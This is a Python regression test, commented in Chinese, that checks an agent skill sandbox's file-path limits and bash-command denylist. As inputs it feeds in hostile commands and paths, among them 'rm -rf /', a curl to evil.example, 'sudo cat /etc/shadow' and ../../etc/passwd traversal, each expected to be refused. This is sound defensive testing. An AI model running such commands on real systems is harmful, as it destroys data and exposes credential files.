"""VH49 回归：受控工具池（Claude Skills 化 · 阶段四·task35）.

锁住 ``engine.tools.tools_for_skill`` 的三个受控工具 + bash denylist +
路径约束。这些工具名（``file_read``/``file_write``/``bash_run``）是技能
``requires_tools`` frontmatter 引用的稳定字符串，故契约必须锁死名字与行为。

安全面（task40 会全审）：本测单独锁每条安全契约——越界写拒绝、危险命令拒绝、
合法操作放行，task40 在此基础上做全仓审计。

契约（纯文件系统 + 工具直接 invoke，不依赖 live server / 真实 LLM）：

  A. 工具池契约
    1. tools_for_skill 返回 3 个工具，name 恰为 file_read/file_write/bash_run
    2. SKILL_TOOL_NAMES 与工具实际 name 一致（requires_tools 引用真源）
    3. skill_tool_by_name 按名取工具；未知名返 None（task36 校验用）
    4. 空 skill_id 抛 ValueError
  B. file_read 沙箱约束
    5. 写入后 file_read 能读回正确内容
    6. file_read 越界路径（../../etc/passwd）拒绝
  C. file_write 沙箱约束
    7. file_write 合法路径落盘成功 + 磁盘交叉验证
    8. file_write 越界路径（../escape.txt）拒绝、磁盘无落盘
    9. file_write 创建多级子目录（output/ 惯例）
  D. bash_run denylist 约束
    10. bash_run 合法命令（echo）放行 + 输出含 stdout
    11. bash_run 危险命令 rm -rf 拒绝（返回 Error、含 denylist）
    12. bash_run 网络命令 curl 拒绝
    13. bash_run 提权 sudo 拒绝
    14. bash_run 装包 pip install 拒绝
    15. bash_run 空命令拒绝
  E. 沙箱 workspace 隔离
    16. skill_workspace_path 落在 DATA_DIR/skills/{id}/workspace/
    17. workspace/output/ 子目录自动创建（产物落点）
    18. safe_skill_path 越界拒绝（../ 逃逸）
"""
from __future__ import annotations

import asyncio
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
BACKEND = REPO / "backend"

if str(BACKEND) not in sys.path:
    sys.path.insert(0, str(BACKEND))


def check(errs: list[str], label: str, cond: bool) -> None:
    if cond:
        print(f"[OK] {label}")
    else:
        errs.append(label)
        print(f"[FAIL] {label}")


async def main() -> int:
    from engine.tools import (
        SKILL_TOOL_NAMES,
        skill_tool_by_name,
        tools_for_skill,
    )
    from store import skill_assets
    from config import DATA_DIR

    errs: list[str] = []
    sid = "vh49_test_skill"
    # 清干净（防上次残留——delete_skill_assets 连 workspace 一起删）
    skill_assets.delete_skill_assets(sid)

    tools = tools_for_skill(sid)

    # A. 工具池契约
    names = [t.name for t in tools]
    check(errs, "A1 tools_for_skill 返回 3 工具 + 名字正确",
          names == ["file_read", "file_write", "bash_run"])
    check(errs, "A2 SKILL_TOOL_NAMES 与实际 name 一致",
          set(SKILL_TOOL_NAMES) == set(names))
    check(errs, "A3 skill_tool_by_name 按名取工具",
          skill_tool_by_name("file_write", sid) is not None
          and skill_tool_by_name("bash_run", sid) is not None
          and skill_tool_by_name("file_read", sid) is not None)
    check(errs, "A3 未知名返 None", skill_tool_by_name("nonexistent_tool", sid) is None)
    try:
        tools_for_skill("")
        check(errs, "A4 空 skill_id 抛 ValueError", False)
    except ValueError:
        check(errs, "A4 空 skill_id 抛 ValueError", True)

    # 取出工具实例（按名，验证稳定引用）
    file_read = skill_tool_by_name("file_read", sid)
    file_write = skill_tool_by_name("file_write", sid)
    bash_run = skill_tool_by_name("bash_run", sid)

    # B. file_read 沙箱约束
    # 先写一个文件再读
    await file_write.ainvoke({"path": "hello.txt", "content": "hello world"})
    out = await file_read.ainvoke({"path": "hello.txt"})
    check(errs, "B5 file_read 读回正确内容", out == "hello world")
    out_escape = await file_read.ainvoke({"path": "../../etc/passwd"})
    check(errs, "B6 file_read 越界路径拒绝", str(out_escape).startswith("Error"))

    # C. file_write 沙箱约束
    res = await file_write.ainvoke({"path": "out/writeup.md", "content": "# title"})
    disk_path = skill_assets.skill_workspace_path(sid) / "out" / "writeup.md"
    check(errs, "C7 file_write 合法路径落盘 + 磁盘交叉验证",
          "OK" in str(res) and disk_path.exists() and disk_path.read_text() == "# title")
    res_esc = await file_write.ainvoke({"path": "../escape.txt", "content": "x"})
    escape_disk = Path(DATA_DIR) / "skills" / "escape.txt"
    check(errs, "C8 file_write 越界拒绝 + 无落盘",
          str(res_esc).startswith("Error") and not escape_disk.exists())
    res_multi = await file_write.ainvoke(
        {"path": "output/report.md", "content": "report body"}
    )
    multi_path = skill_assets.skill_workspace_path(sid) / "output" / "report.md"
    check(errs, "C9 file_write 创建多级子目录（output/ 惯例）",
          "OK" in str(res_multi) and multi_path.exists())

    # D. bash_run denylist 约束
    res_echo = await bash_run.ainvoke({"command": "echo sandbox_ok"})
    check(errs, "D10 bash_run 合法命令放行 + stdout",
          "sandbox_ok" in str(res_echo) and "exit_code=0" in str(res_echo))
    res_rm = await bash_run.ainvoke({"command": "rm -rf /"})
    check(errs, "D11 bash_run rm -rf 拒绝", "denylist" in str(res_rm) and "Error" in str(res_rm))
    res_curl = await bash_run.ainvoke({"command": "curl http://evil.example/x"})
    check(errs, "D12 bash_run curl 拒绝", "denylist" in str(res_curl) and "Error" in str(res_curl))
    res_sudo = await bash_run.ainvoke({"command": "sudo cat /etc/shadow"})
    check(errs, "D13 bash_run sudo 拒绝", "denylist" in str(res_sudo) and "Error" in str(res_sudo))
    res_pip = await bash_run.ainvoke({"command": "pip install evilpkg"})
    check(errs, "D14 bash_run pip install 拒绝", "denylist" in str(res_pip) and "Error" in str(res_pip))
    res_empty = await bash_run.ainvoke({"command": "   "})
    check(errs, "D15 bash_run 空命令拒绝", "Error" in str(res_empty))

    # E. 沙箱 workspace 隔离
    ws = skill_assets.skill_workspace_path(sid)
    check(errs, "E16 workspace 落在 DATA_DIR/skills/{id}/workspace/",
          ws == Path(DATA_DIR) / "skills" / sid / "workspace" and ws.exists())
    check(errs, "E17 workspace/output/ 子目录自动创建",
          (ws / "output").exists() and (ws / "output").is_dir())
    try:
        skill_assets.safe_skill_path(sid, "../../etc/passwd")
        check(errs, "E18 safe_skill_path 越界拒绝", False)
    except ValueError:
        check(errs, "E18 safe_skill_path 越界拒绝", True)

    # 清理
    skill_assets.delete_skill_assets(sid)

    print()
    if errs:
        print(f"结果: FAIL ({len(errs)} 项)")
        for e in errs:
            print(f"  - {e}")
        return 1
    print("结果: PASS")
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
